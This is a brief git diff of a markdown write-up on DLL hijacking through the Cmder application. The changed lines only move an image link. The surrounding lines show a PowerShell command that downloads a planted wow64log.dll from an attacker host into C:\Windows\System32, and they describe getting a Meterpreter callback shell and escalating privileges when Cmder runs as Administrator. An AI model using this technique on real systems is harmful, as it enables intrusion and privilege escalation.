@@ -34,9 +34,10 @@ python3 -m http.server
 cd C:\Windows\System32
 iwr http://kali.space:8000/wow64log.dll -o wow64log.dll
 ````
-![image](https://github.com/user-attachments/assets/ef851afc-fae9-43a6-bc10-1c52aa2e3a4a)
 - Upon opening the application we will recieve a call back.
 - From testing your Meterpreter shell will drop you into `C:\Windows` and your pid will be associated to `rundll32.exe`. Your PPID will no longer be running on the system.
+![image](https://github.com/user-attachments/assets/ef851afc-fae9-43a6-bc10-1c52aa2e3a4a)
+
 ## Privilege Escalation
 - From testing if the Cmder application is run without Administrator permissions you will recieve a shell in the context of your user account.
 - If the Cmder application is run WITH Administrator permissions you will recieve a shell in the context of the Admin privileged account.
